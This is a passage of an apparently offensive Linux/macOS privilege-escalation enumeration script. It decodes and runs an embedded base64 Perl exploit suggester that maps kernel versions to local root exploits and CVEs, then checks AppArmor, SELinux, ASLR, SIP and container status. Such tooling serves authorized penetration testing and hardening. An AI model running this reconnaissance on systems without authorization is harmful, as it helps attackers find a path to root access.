gICAgICAgICAgICcyLjYuMzQnLCAnMi42LjM1JywgJzIuNi4zNicsCiAgICAgICAgXSwKICAgICAgICBtaWwgPT4gJ2h0dHA6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMTUyODUnLAogICAgICAgIGN2ZSA9PiAnMjAxMC0zOTA0JywKICAgIH0sCiAgICAnaGFsZl9uZWxzb24xJyA9PiB7CiAgICAgICAgdnVsbiA9PiBbCiAgICAgICAgICAgICcyLjYuMCcsICAnMi42LjEnLCAgJzIuNi4yJywgICcyLjYuMycsICAnMi42LjQnLCAgJzIuNi41JywKICAgICAgICAgICAgJzIuNi42JywgICcyLjYuNycsICAnMi42LjgnLCAgJzIuNi45JywgICcyLjYuMTAnLCAnMi42LjExJywKICAgICAgICAgICAgJzIuNi4xMicsICcyLjYuMTMnLCAnMi42LjE0JywgJzIuNi4xNScsICcyLjYuMTYnLCAnMi42LjE3JywKICAgICAgICAgICAgJzIuNi4xOCcsICcyLjYuMTknLCAnMi42LjIwJywgJzIuNi4yMScsICcyLjYuMjInLCAnMi42LjIzJywKICAgICAgICAgICAgJzIuNi4yNCcsICcyLjYuMjUnLCAnMi42LjI2JywgJzIuNi4yNycsICcyLjYuMjgnLCAnMi42LjI5JywKICAgICAgICAgICAgJzIuNi4zMCcsICcyLjYuMzEnLCAnMi42LjMyJywgJzIuNi4zMycsICcyLjYuMzQnLCAnMi42LjM1JywKICAgICAgICAgICAgJzIuNi4zNicsCiAgICAgICAgXSwKICAgICAgICBhbHQgPT4gJ2Vjb25ldCcsCiAgICAgICAgY3ZlID0+ICcyMDEwLTM4NDgnLAogICAgICAgIG1pbCA9PiAnaHR0cDovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy8xNzc4NycsCiAgICB9LAogICAgJ2hhbGZfbmVsc29uMicgPT4gewogICAgICAgIHZ1bG4gPT4gWwogICAgICAgICAgICAnMi42LjAnLCAgJzIuNi4xJywgICcyLjYuMicsICAnMi42LjMnLCAgJzIuNi40JywgICcyLjYuNScsCiAgICAgICAgICAgICcyLjYuNicsICAnMi42LjcnLCAgJzIuNi44JywgICcyLjYuOScsICAnMi42LjEwJywgJzIuNi4xMScsCiAgICAgICAgICAgICcyLjYuMTInLCAnMi42LjEzJywgJzIuNi4xNCcsICcyLjYuMTUnLCAnMi42LjE2JywgJzIuNi4xNycsCiAgICAgICAgICAgICcyLjYuMTgnLCAnMi42LjE5JywgJzIuNi4yMCcsICcyLjYuMjEnLCAnMi42LjIyJywgJzIuNi4yMycsCiAgICAgICAgICAgICcyLjYuMjQnLCAnMi42LjI1JywgJzIuNi4yNicsICcyLjYuMjcnLCAnMi42LjI4JywgJzIuNi4yOScsCiAgICAgICAgICAgICcyLjYuMzAnLCAnMi42LjMxJywgJzIuNi4zMicsICcyLjYuMzMnLCAnMi42LjM0JywgJzIuNi4zNScsCiAgICAgICAgICAgICcyLjYuMzYnLAogICAgICAgIF0sCiAgICAgICAgYWx0ID0+ICdlY29uZXQnLAogICAgICAgIGN2ZSA9PiAnMjAxMC0zODUwJywKICAgICAgICBtaWwgPT4gJ2h0dHA6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMTc3ODcnLAogICAgfSwKICAgICdoYWxmX25lbHNvbjMnID0+IHsKICAgICAgICB2dWxuID0+IFsKICAgICAgICAgICAgJzIuNi4wJywgICcyLjYuMScsICAnMi42LjInLCAgJzIuNi4zJywgICcyLjYuNCcsICAnMi42LjUnLAogICAgICAgICAgICAnMi42LjYnLCAgJzIuNi43JywgICcyLjYuOCcsICAnMi42LjknLCAgJzIuNi4xMCcsICcyLjYuMTEnLAogICAgICAgICAgICAnMi42LjEyJywgJzIuNi4xMycsICcyLjYuMTQnLCAnMi42LjE1JywgJzIuNi4xNicsICcyLjYuMTcnLAogICAgICAgICAgICAnMi42LjE4JywgJzIuNi4xOScsICcyLjYuMjAnLCAnMi42LjIxJywgJzIuNi4yMicsICcyLjYuMjMnLAogICAgICAgICAgICAnMi42LjI0JywgJzIuNi4yNScsICcyLjYuMjYnLCAnMi42LjI3JywgJzIuNi4yOCcsICcyLjYuMjknLAogICAgICAgICAgICAnMi42LjMwJywgJzIuNi4zMScsICcyLjYuMzInLCAnMi42LjMzJywgJzIuNi4zNCcsICcyLjYuMzUnLAogICAgICAgICAgICAnMi42LjM2JywKICAgICAgICBdLAogICAgICAgIGFsdCA9PiAnZWNvbmV0JywKICAgICAgICBjdmUgPT4gJzIwMTAtNDA3MycsCiAgICAgICAgbWlsID0+ICdodHRwOi8vd3d3LmV4cGxvaXQtZGIuY29tL2V4cGxvaXRzLzE3Nzg3JywKICAgIH0sCiAgICAnY2Fwc190b19yb290JyA9PiB7CiAgICAgICAgdnVsbiA9PiBbICcyLjYuMzQnLCAnMi42LjM1JywgJzIuNi4zNicgXSwKICAgICAgICBjdmUgID0+ICduL2EnLAogICAgICAgIG1pbCA9PiAnaHR0cDovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy8xNTkxNicsCiAgICB9LAogICAgJ2FtZXJpY2FuLXNpZ24tbGFuZ3VhZ2UnID0+IHsKICAgICAgICB2dWxuID0+IFsKICAgICAgICAgICAgJzIuNi4wJywgICcyLjYuMScsICAnMi42LjInLCAgJzIuNi4zJywgICcyLjYuNCcsICAnMi42LjUnLAogICAgICAgICAgICAnMi42LjYnLCAgJzIuNi43JywgICcyLjYuOCcsICAnMi42LjknLCAgJzIuNi4xMCcsICcyLjYuMTEnLAogICAgICAgICAgICAnMi42LjEyJywgJzIuNi4xMycsICcyLjYuMTQnLCAnMi42LjE1JywgJzIuNi4xNicsICcyLjYuMTcnLAogICAgICAgICAgICAnMi42LjE4JywgJzIuNi4xOScsICcyLjYuMjAnLCAnMi42LjIxJywgJzIuNi4yMicsICcyLjYuMjMnLAogICAgICAgICAgICAnMi42LjI0JywgJzIuNi4yNScsICcyLjYuMjYnLCAnMi42LjI3JywgJzIuNi4yOCcsICcyLjYuMjknLAogICAgICAgICAgICAnMi42LjMwJywgJzIuNi4zMScsICcyLjYuMzInLCAnMi42LjMzJywgJzIuNi4zNCcsICcyLjYuMzUnLAogICAgICAgICAgICAnMi42LjM2JywKICAgICAgICBdLAogICAgICAgIGN2ZSA9PiAnMjAxMC00MzQ3JywKICAgICAgICBtaWwgPT4gJ2h0dHA6Ly93d3cuc2VjdXJpdHlmb2N1cy5jb20vYmlkLzQ1NDA4JywKICAgIH0sCiAgICAncGt0Y2R2ZCcgPT4gewogICAgICAgIHZ1bG4gPT4gWwogICAgICAgICAgICAnMi42LjAnLCAgJzIuNi4xJywgICcyLjYuMicsICAnMi42LjMnLCAgJzIuNi40JywgICcyLjYuNScsCiAgICAgICAgICAgICcyLjYuNicsICAnMi42LjcnLCAgJzIuNi44JywgICcyLjYuOScsICAnMi42LjEwJywgJzIuNi4xMScsCiAgICAgICAgICAgICcyLjYuMTInLCAnMi42LjEzJywgJzIuNi4xNCcsICcyLjYuMTUnLCAnMi42LjE2JywgJzIuNi4xNycsCiAgICAgICAgICAgICcyLjYuMTgnLCAnMi42LjE5JywgJzIuNi4yMCcsICcyLjYuMjEnLCAnMi42LjIyJywgJzIuNi4yMycsCiAgICAgICAgICAgICcyLjYuMjQnLCAnMi42LjI1JywgJzIuNi4yNicsICcyLjYuMjcnLCAnMi42LjI4JywgJzIuNi4yOScsCiAgICAgICAgICAgICcyLjYuMzAnLCAnMi42LjMxJywgJzIuNi4zMicsICcyLjYuMzMnLCAnMi42LjM0JywgJzIuNi4zNScsCiAgICAgICAgICAgICcyLjYuMzYnLAogICAgICAgIF0sCiAgICAgICAgY3ZlID0+ICcyMDEwLTM0MzcnLAogICAgICAgIG1pbCA9PiAnaHR0cDovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy8xNTE1MCcsCiAgICB9LAogICAgJ3ZpZGVvNGxpbnV4JyA9PiB7CiAgICAgICAgdnVsbiA9PiBbCiAgICAgICAgICAgICcyLjYuMCcsICAnMi42LjEnLCAgJzIuNi4yJywgICcyLjYuMycsICAnMi42LjQnLCAgJzIuNi41JywKICAgICAgICAgICAgJzIuNi42JywgICcyLjYuNycsICAnMi42LjgnLCAgJzIuNi45JywgICcyLjYuMTAnLCAnMi42LjExJywKICAgICAgICAgICAgJzIuNi4xMicsICcyLjYuMTMnLCAnMi42LjE0JywgJzIuNi4xNScsICcyLjYuMTYnLCAnMi42LjE3JywKICAgICAgICAgICAgJzIuNi4xOCcsICcyLjYuMTknLCAnMi42LjIwJywgJzIuNi4yMScsICcyLjYuMjInLCAnMi42LjIzJywKICAgICAgICAgICAgJzIuNi4yNCcsICcyLjYuMjUnLCAnMi42LjI2JywgJzIuNi4yNycsICcyLjYuMjgnLCAnMi42LjI5JywKICAgICAgICAgICAgJzIuNi4zMCcsICcyLjYuMzEnLCAnMi42LjMyJywgJzIuNi4zMycsCiAgICAgICAgXSwKICAgICAgICBjdmUgPT4gJzIwMTAtMzA4MScsCiAgICAgICAgbWlsID0+ICdodHRwOi8vd3d3LmV4cGxvaXQtZGIuY29tL2V4cGxvaXRzLzE1MDI0JywKICAgIH0sCiAgICAnbWVtb2RpcHBlcicgPT4gewogICAgICAgIHZ1bG4gPT4gWwogICAgICAgICAgICAnMi42LjM5JywgJzMuMC4wJywgJzMuMC4xJywgJzMuMC4yJywgJzMuMC4zJywgJzMuMC40JywKICAgICAgICAgICAgJzMuMC41JywgICczLjAuNicsICczLjEuMCcsCiAgICAgICAgXSwKICAgICAgICBjdmUgPT4gJzIwMTItMDA1NicsCiAgICAgICAgbWlsID0+ICdodHRwOi8vd3d3LmV4cGxvaXQtZGIuY29tL2V4cGxvaXRzLzE4NDExJywKICAgIH0sCiAgICAnc2VtdGV4JyA9PiB7CiAgICAgICAgdnVsbiA9PiBbCiAgICAgICAgICAgICcyLjYuMzcnLCAnMi42LjM4JywgJzIuNi4zOScsICczLjAuMCcsICczLjAuMScsICczLjAuMicsCiAgICAgICAgICAgICczLjAuMycsICAnMy4wLjQnLCAgJzMuMC41JywgICczLjAuNicsICczLjEuMCcsCiAgICAgICAgXSwKICAgICAgICBjdmUgPT4gJzIwMTMtMjA5NCcsCiAgICAgICAgbWlsID0+ICdodHRwOi8vd3d3LmV4cGxvaXQtZGIuY29tL2V4cGxvaXRzLzI1NDQ0JywKICAgIH0sCiAgICAncGVyZl9zd2V2ZW50JyA9PiB7CiAgICAgICAgdnVsbiA9PiBbCiAgICAgICAgICAgICczLjAuMCcsICczLjAuMScsICczLjAuMicsICczLjAuMycsICczLjAuNCcsICczLjAuNScsCiAgICAgICAgICAgICczLjAuNicsICczLjEuMCcsICczLjIuMCcsICczLjMuMCcsICczLjQuMCcsICczLjQuMScsCiAgICAgICAgICAgICczLjQuMicsICczLjQuMycsICczLjQuNCcsICczLjQuNScsICczLjQuNicsICczLjQuOCcsCiAgICAgICAgICAgICczLjQuOScsICczLjUuMCcsICczLjYuMCcsICczLjcuMCcsICczLjguMCcsICczLjguMScsCiAgICAgICAgICAgICczLjguMicsICczLjguMycsICczLjguNCcsICczLjguNScsICczLjguNicsICczLjguNycsCiAgICAgICAgICAgICczLjguOCcsICczLjguOScsCiAgICAgICAgXSwKICAgICAgICBjdmUgPT4gJzIwMTMtMjA5NCcsCiAgICAgICAgbWlsID0+ICdodHRwOi8vd3d3LmV4cGxvaXQtZGIuY29tL2V4cGxvaXRzLzI2MTMxJywKICAgIH0sCiAgICAnbXNyJyA9PiB7CiAgICAgICAgdnVsbiA9PiBbCiAgICAgICAgICAgICcyLjYuMTgnLCAnMi42LjE5JywgJzIuNi4yMCcsICcyLjYuMjEnLCAnMi42LjIyJywgJzIuNi4yMycsCiAgICAgICAgICAgICcyLjYuMjQnLCAnMi42LjI1JywgJzIuNi4yNicsICcyLjYuMjcnLCAnMi42LjI3JywgJzIuNi4yOCcsCiAgICAgICAgICAgICcyLjYuMjknLCAnMi42LjMwJywgJzIuNi4zMScsICcyLjYuMzInLCAnMi42LjMzJywgJzIuNi4zNCcsCiAgICAgICAgICAgICcyLjYuMzUnLCAnMi42LjM2JywgJzIuNi4zNycsICcyLjYuMzgnLCAnMi42LjM5JywgJzMuMC4wJywKICAgICAgICAgICAgJzMuMC4xJywgICczLjAuMicsICAnMy4wLjMnLCAgJzMuMC40JywgICczLjAuNScsICAnMy4wLjYnLAogICAgICAgICAgICAnMy4xLjAnLCAgJzMuMi4wJywgICczLjMuMCcsICAnMy40LjAnLCAgJzMuNS4wJywgICczLjYuMCcsCiAgICAgICAgICAgICczLjcuMCcsICAnMy43LjYnLAogICAgICAgIF0sCiAgICAgICAgY3ZlID0+ICcyMDEzLTAyNjgnLAogICAgICAgIG1pbCA9PiAnaHR0cDovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy8yNzI5NycsCiAgICB9LAogICAgJ3RpbWVvdXRwd24nID0+IHsKICAgICAgICB2dWxuID0+IFsKICAgICAgICAgICAgJzMuNC4wJywgICczLjUuMCcsICAnMy42LjAnLCAgJzMuNy4wJywgICczLjguMCcsICAnMy44LjknLCAKICAgICAgICAgICAgJzMuOS4wJywgICczLjEwLjAnLCAnMy4xMS4wJywgJzMuMTIuMCcsICczLjEzLjAnLCAnMy40LjAnLAogICAgICAgICAgICAnMy41LjAnLCAgJzMuNi4wJywgICczLjcuMCcsICAnMy44LjAnLCAgJzMuOC41JywgICczLjguNicsICAKICAgICAgICAgICAgJzMuOC45JywgICczLjkuMCcsICAnMy45LjYnLCAgJzMuMTAuMCcsICczLjEwLjYnLCAnMy4xMS4wJywKICAgICAgICAgICAgJzMuMTIuMCcsICczLjEzLjAnLCAnMy4xMy4xJwogICAgICAgIF0sCiAgICAgICAgY3ZlID0+ICcyMDE0LTAwMzgnLAogICAgICAgIG1pbCA9PiAnaHR0cDovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy8zMTM0NicsCiAgICB9LAogICAgJ3Jhd21vZGVQVFknID0+IHsKICAgICAgICB2dWxuID0+IFsKICAgICAgICAgICAgJzIuNi4zMScsICcyLjYuMzInLCAnMi42LjMzJywgJzIuNi4zNCcsICcyLjYuMzUnLCAnMi42LjM2JywKICAgICAgICAgICAgJzIuNi4zNycsICcyLjYuMzgnLCAnMi42LjM5JywgJzMuMTQuMCcsICczLjE1LjAnCiAgICAgICAgXSwKICAgICAgICBjdmUgPT4gJzIwMTQtMDE5NicsCiAgICAgICAgbWlsID0+ICdodHRwOi8vcGFja2V0c3Rvcm1zZWN1cml0eS5jb20vZmlsZXMvZG93bmxvYWQvMTI2NjAzL2N2ZS0yMDE0LTAxOTYtbWQuYycsCiAgICB9LAogICAgJ292ZXJsYXlmcycgPT4gewogICAgICAgIHZ1bG4gPT4gWwogICAgICAgICAgICAnMy4xMy4wJywgJzMuMTYuMCcsICczLjE5LjAnCiAgICAgICAgXSwKICAgICAgICBjdmUgPT4gJzIwMTUtODY2MCcsCiAgICAgICAgbWlsID0+ICdodHRwOi8vd3d3LmV4cGxvaXQtZGIuY29tL2V4cGxvaXRzLzM5MjMwJywKICAgIH0sCiAgICAncHBfa2V5JyA9PiB7CiAgICAgICAgdnVsbiA9PiBbCgkJCSczLjQuMCcsICAnMy41LjAnLCAgJzMuNi4wJywgICczLjcuMCcsICAnMy44LjAnLCAgJzMuOC4xJywgIAogICAgICAgICAgICAnMy44LjInLCAgJzMuOC4zJywgICczLjguNCcsICAnMy44LjUnLCAgJzMuOC42JywgICczLjguNycsICAKICAgICAgICAgICAgJzMuOC44JywgICczLjguOScsICAnMy45LjAnLCAgJzMuOS42JywgICczLjEwLjAnLCAnMy4xMC42JywgCiAgICAgICAgICAgICczLjExLjAnLCAnMy4xMi4wJywgJzMuMTMuMCcsICczLjEzLjEnCiAgICAgICAgXSwKICAgICAgICBjdmUgPT4gJzIwMTYtMDcyOCcsCiAgICAgICAgbWlsID0+ICdodHRwOi8vd3d3LmV4cGxvaXQtZGIuY29tL2V4cGxvaXRzLzM5Mjc3JywKICAgIH0sCiAgICAnZGlydHlfY293JyA9PiB7CiAgICAgICAgdnVsbiA9PiBbCiAgICAgICAgICAgICcyLjYuMjInLCAnMi42LjIzJywgJzIuNi4yNCcsICcyLjYuMjUnLCAnMi42LjI2JywgJzIuNi4yNycsIAoJCQknMi42LjI3JywgJzIuNi4yOCcsICcyLjYuMjknLCAnMi42LjMwJywgJzIuNi4zMScsICcyLjYuMzInLCAKICAgICAgICAgICAgJzIuNi4zMycsICcyLjYuMzQnLCAnMi42LjM1JywgJzIuNi4zNicsICcyLjYuMzcnLCAnMi42LjM4JywgCiAgICAgICAgICAgICcyLjYuMzknLCAnMy4wLjAnLCAgJzMuMC4xJywgICczLjAuMicsICAnMy4wLjMnLCAgJzMuMC40JywgIAogICAgICAgICAgICAnMy4wLjUnLCAgJzMuMC42JywgICczLjEuMCcsICAnMy4yLjAnLCAgJzMuMy4wJywgICczLjQuMCcsICAKICAgICAgICAgICAgJzMuNS4wJywgICczLjYuMCcsICAnMy43LjAnLCAgJzMuNy42JywgICczLjguMCcsICAnMy45LjAnCiAgICAgICAgXSwKICAgICAgICBjdmUgPT4gJzIwMTYtNTE5NScsCiAgICAgICAgbWlsID0+ICdodHRwOi8vd3d3LmV4cGxvaXQtZGIuY29tL2V4cGxvaXRzLzQwNjE2JywKICAgIH0sCiAgICAnYWZfcGFja2V0JyA9PiB7CiAgICAgICAgdnVsbiA9PiBbJzQuNC4wJyBdLAogICAgICAgIGN2ZSA9PiAnMjAxNi04NjU1JywKICAgICAgICBtaWwgPT4gJ2h0dHA6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNDA4NzEnLAogICAgfSwKICAgICdwYWNrZXRfc2V0X3JpbmcnID0+IHsKICAgICAgICB2dWxuID0+IFsnNC44LjAnIF0sCiAgICAgICAgY3ZlID0+ICcyMDE3LTczMDgnLAogICAgICAgIG1pbCA9PiAnaHR0cDovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy80MTk5NCcsCiAgICB9LAogICAgJ2Nsb25lX25ld3VzZXInID0+IHsKICAgICAgICB2dWxuID0+IFsKICAgICAgICAgICAgJzMuMy41JywgJzMuMy40JywgJzMuMy4yJywgJzMuMi4xMycsICczLjIuOScsICczLjIuMScsIAogICAgICAgICAgICAnMy4xLjgnLCAnMy4wLjUnLCAnMy4wLjQnLCAnMy4wLjInLCAnMy4wLjEnLCAnMy4yJywgJzMuMC4xJywgJzMuMCcKICAgICAgICBdLAogICAgICAgIGN2ZSA9PiAnTlxBJywKICAgICAgICBtaWwgPT4gJ2h0dHA6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMzgzOTAnLAogICAgfSwKICAgICdnZXRfcmVrdCcgPT4gewogICAgICAgIHZ1bG4gPT4gWwogICAgICAgICAgICAnNC40LjAnLCAnNC44LjAnLCAnNC4xMC4wJywgJzQuMTMuMCcKICAgICAgICBdLAogICAgICAgIGN2ZSA9PiAnMjAxNy0xNjY5NScsCiAgICAgICAgbWlsID0+ICdodHRwOi8vd3d3LmV4cGxvaXQtZGIuY29tL2V4cGxvaXRzLzQ1MDEwJywKICAgIH0sCiAgICAnZXhwbG9pdF94JyA9PiB7CiAgICAgICAgdnVsbiA9PiBbCiAgICAgICAgICAgICcyLjYuMjInLCAnMi42LjIzJywgJzIuNi4yNCcsICcyLjYuMjUnLCAnMi42LjI2JywgJzIuNi4yNycsCiAgICAgICAgICAgICcyLjYuMjcnLCAnMi42LjI4JywgJzIuNi4yOScsICcyLjYuMzAnLCAnMi42LjMxJywgJzIuNi4zMicsCiAgICAgICAgICAgICcyLjYuMzMnLCAnMi42LjM0JywgJzIuNi4zNScsICcyLjYuMzYnLCAnMi42LjM3JywgJzIuNi4zOCcsCiAgICAgICAgICAgICcyLjYuMzknLCAnMy4wLjAnLCAgJzMuMC4xJywgICczLjAuMicsICAnMy4wLjMnLCAgJzMuMC40JywKICAgICAgICAgICAgJzMuMC41JywgICczLjAuNicsICAnMy4xLjAnLCAgJzMuMi4wJywgICczLjMuMCcsICAnMy40LjAnLAogICAgICAgICAgICAnMy41LjAnLCAgJzMuNi4wJywgICczLjcuMCcsICAnMy43LjYnLCAgJzMuOC4wJywgICczLjkuMCcsCiAgICAgICAgICAgICczLjEwLjAnLCAnMy4xMS4wJywgJzMuMTIuMCcsICczLjEzLjAnLCAnMy4xNC4wJywgJzMuMTUuMCcsCiAgICAgICAgICAgICczLjE2LjAnLCAnMy4xNy4wJywgJzMuMTguMCcsICczLjE5LjAnLCAnNC4wLjAnLCAgJzQuMS4wJywKICAgICAgICAgICAgJzQuMi4wJywgICc0LjMuMCcsICAnNC40LjAnLCAgJzQuNS4wJywgICc0LjYuMCcsICAnNC43LjAnCiAgICAgICAgXSwKICAgICAgICBjdmUgPT4gJzIwMTgtMTQ2NjUnLAogICAgICAgIG1pbCA9PiAnaHR0cDovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy80NTY5NycsCiAgICB9LAogICk7Cn0KCl9fRU5EX18KPWhlYWQxIE5BTUUKCmxpbnV4X2V4cGxvaXRfc3VnZ2VzdGVyLTIucGwgLSBBIGxvY2FsIGV4cGxvaXQgc3VnZ2VzdGVyIGZvciBsaW51eAoKPWhlYWQxIERFU0NSSVBUSU9OCgpUaGlzIHBlcmwgc2NyaXB0IHdpbGwgZW51bWVyYXRlIHRoZSBwb3NzaWJsZSBleHBsb2l0cyBhdmFpbGFibGUgZm9yIGEgZ2l2ZW4ga2VybmVsIHZlcnNpb24KCj1oZWFkMSBVU0FHRQoKWy1oXSBIZWxwICh0aGlzIG1lc3NhZ2UpClsta10gS2VybmVsIG51bWJlciAoZWcuIDIuNi4yOCkKWy1kXSBPcGVuIGV4cGxvaXQgZG93bmxvYWQgbWVudQoKWW91IGNhbiBhbHNvIHByb3ZpZGUgYSBwYXJ0aWFsIGtlcm5lbCB2ZXJzaW9uIChlZy4gMi40KQp0byBzZWUgYWxsIGV4cGxvaXRzIGF2YWlsYWJsZS4KCj1oZWFkMSBBVVRIT1IKCkpvbmF0aGFuIERvbmFzIChjKSAyMDE5Cgo9Y3V0Cgo9aGVhZDEgTElDRU5TRQoKIExpbnV4IEV4cGxvaXQgU3VnZ2VzdGVyIDIKCiBUaGlzIHByb2dyYW0gaXMgZnJlZSBzb2Z0d2FyZTsgeW91IGNhbiByZWRpc3RyaWJ1dGUgaXQgYW5kL29yIG1vZGlmeQogaXQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSBhcyBwdWJsaXNoZWQgYnkKIHRoZSBGcmVlIFNvZnR3YXJlIEZvdW5kYXRpb247IGVpdGhlciB2ZXJzaW9uIDIgb2YgdGhlIExpY2Vuc2UsIG9yCiAoYXQgeW91ciBvcHRpb24pIGFueSBsYXRlciB2ZXJzaW9uLgoKIFRoaXMgcHJvZ3JhbSBpcyBkaXN0cmlidXRlZCBpbiB0aGUgaG9wZSB0aGF0IGl0IHdpbGwgYmUgdXNlZnVsLAogYnV0IFdJVEhPVVQgQU5ZIFdBUlJBTlRZOyB3aXRob3V0IGV2ZW4gdGhlIGltcGxpZWQgd2FycmFudHkgb2YKIE1FUkNIQU5UQUJJTElUWSBvciBGSVRORVNTIEZPUiBBIFBBUlRJQ1VMQVIgUFVSUE9TRS4gIFNlZSB0aGUKIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlIGZvciBtb3JlIGRldGFpbHMuCiAgICAgICAgCiBZb3Ugc2hvdWxkIGhhdmUgcmVjZWl2ZWQgYSBjb3B5IG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSBhbG9uZwogd2l0aCB0aGlzIHByb2dyYW07IGlmIG5vdCwgd3JpdGUgdG8gdGhlIEZyZWUgU29mdHdhcmUgRm91bmRhdGlvbiwgSW5jLiwKIDUxIEZyYW5rbGluIFN0cmVldCwgRmlmdGggRmxvb3IsIEJvc3RvbiwgTUEgMDIxMTAtMTMwMSBVU0EuCgo9Y3V0Cg=="
    echo $les2_b64 | base64 -d | perl 2>/dev/null | sed "s,$(printf '\033')\\[[0-9;]*[a-zA-Z],,g" | grep -i "CVE" -B 1 -A 10 | grep -Ev "^\-\-$" | sed -${E} "s,CVE-[0-9]+-[0-9]+,${SED_RED},g"
    echo ""
fi

if [ "$MACPEAS" ] && [ "$(command -v brew 2>/dev/null)" ]; then
    print_2title "Brew Doctor Suggestions"
    brew doctor
    echo ""
fi


print_2title "Protections"
print_list "AppArmor enabled? .............. "$NC
if [ "$(command -v aa-status 2>/dev/null)" ]; then
    aa-status 2>&1 | sed "s,disabled,${SED_RED},"
elif [ "$(command -v apparmor_status 2>/dev/null)" ]; then
    apparmor_status 2>&1 | sed "s,disabled,${SED_RED},"
elif [ "$(ls -d /etc/apparmor* 2>/dev/null)" ]; then
    ls -d /etc/apparmor*
else
    echo_not_found "AppArmor"
fi


print_list "grsecurity present? ............ "$NC
( (uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo_not_found "grsecurity")


print_list "PaX bins present? .............. "$NC
(command -v paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo_not_found "PaX")


print_list "Execshield enabled? ............ "$NC
(grep "exec-shield" /etc/sysctl.conf 2>/dev/null || echo_not_found "Execshield") | sed "s,=0,${SED_RED},"


print_list "SELinux enabled? ............... "$NC
(sestatus 2>/dev/null || echo_not_found "sestatus") | sed "s,disabled,${SED_RED},"


print_list "Seccomp enabled? ............... "$NC
([ "$(grep Seccomp /proc/self/status | grep -v 0)" ] && echo "enabled" || echo "disabled") | sed "s,disabled,${SED_RED}," | sed "s,enabled,${SED_GREEN},"


print_list "AppArmor profile? .............. "$NC
(cat /proc/self/attr/current 2>/dev/null || echo "disabled") | sed "s,disabled,${SED_RED}," | sed "s,kernel,${SED_GREEN},"


print_list "User namespace? ................ "$NC
if [ "$(cat /proc/self/uid_map 2>/dev/null)" ]; then echo "enabled" | sed "s,enabled,${SED_GREEN},"; else echo "disabled" | sed "s,disabled,${SED_RED},"; fi


print_list "Cgroup2 enabled? ............... "$NC
([ "$(grep cgroup2 /proc/filesystems)" ] && echo "enabled" || echo "disabled") | sed "s,disabled,${SED_RED}," | sed "s,enabled,${SED_GREEN},"


if [ "$MACPEAS" ]; then
    print_list "Gatekeeper enabled? .......... "$NC
    (spctl --status 2>/dev/null || echo_not_found "sestatus") | sed "s,disabled,${SED_RED},"

    print_list "sleepimage encrypted? ........ "$NC
    (sysctl vm.swapusage | grep "encrypted" | sed "s,encrypted,${SED_GREEN},") || echo_no

    print_list "XProtect? .................... "$NC
    (system_profiler SPInstallHistoryDataType 2>/dev/null | grep -A 4 "XProtectPlistConfigData" | tail -n 5 | grep -Iv "^$") || echo_no

    print_list "SIP enabled? ................. "$NC
    csrutil status | sed "s,enabled,${SED_GREEN}," | sed "s,disabled,${SED_RED}," || echo_no

    print_list "Connected to JAMF? ........... "$NC
    warn_exec jamf checkJSSConnection

    print_list "Connected to AD? ............. "$NC
    dsconfigad -show && echo "" || echo_no
fi


print_list "Is ASLR enabled? ............... "$NC
ASLR=$(cat /proc/sys/kernel/randomize_va_space 2>/dev/null)
if [ -z "$ASLR" ]; then
    echo_not_found "/proc/sys/kernel/randomize_va_space";
else
    if [ "$ASLR" -eq "0" ]; then printf $RED"No"$NC; else printf $GREEN"Yes"$NC; fi
    echo ""
fi

print_list "Printer? ....................... "$NC
(lpstat -a || system_profiler SPPrintersDataType || echo_no) 2>/dev/null


print_list "Is this a virtual machine? ..... "$NC
hypervisorflag=$(grep flags /proc/cpuinfo 2>/dev/null | grep hypervisor)
if [ "$(command -v systemd-detect-virt 2>/dev/null)" ]; then
    detectedvirt=$(systemd-detect-virt)
    if [ "$hypervisorflag" ]; then printf $RED"Yes ($detectedvirt)"$NC; else printf $GREEN"No"$NC; fi
else
    if [ "$hypervisorflag" ]; then printf $RED"Yes"$NC; else printf $GREEN"No"$NC; fi
fi

fi
echo ''
echo ''
if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi

if echo $CHECKS | grep -q container; then
print_title "Container"

containerCheck() {
  inContainer=""
  containerType="$(echo_no)"


  if [ -f "/.dockerenv" ] ||
    grep "/docker/" /proc/1/cgroup -qa 2>/dev/null ||
    grep -qai docker /proc/self/cgroup  2>/dev/null ||
    [ "$(find / -maxdepth 3 -name '*dockerenv*' -exec ls -la {} \; 2>/dev/null)" ] ; then

    inContainer="1"
    containerType="docker\n"
  fi

  if grep "/kubepod" /proc/1/cgroup -qa 2>/dev/null ||
    grep -qai kubepods /proc/self/cgroup 2>/dev/null; then

    inContainer="1"
    if [ "$containerType" ]; then containerType="$containerType (kubernetes)\n"
    else containerType="kubernetes\n"
    fi
  fi
  
  if grep "/concourse" /proc/1/mounts -qa 2>/dev/null; then
    inContainer="1"
    if [ "$containerType" ]; then 
      containerType="$containerType (concourse)\n"
    fi
  fi

  if env | grep "container=lxc" -qa 2>/dev/null ||
      grep "/lxc/" /proc/1/cgroup -qa 2>/dev/null; then

    inContainer="1"
    containerType="lxc\n"
  fi


  if env | grep -qa "container=podman" 2>/dev/null ||
      grep -qa "container=podman" /proc/1/environ 2>/dev/null; then

    inContainer="1"
    containerType="podman\n"
  fi

  if [ -z "$inContainer" ]; then
    if grep -a 'container=' /proc/1/environ 2>/dev/null; then
      inContainer="1"
      containerType="$(grep -a 'container=' /proc/1/environ | cut -d= -f2)\n"
    fi
  fi
}

inDockerGroup() {
  DOCKER_GROUP="No"
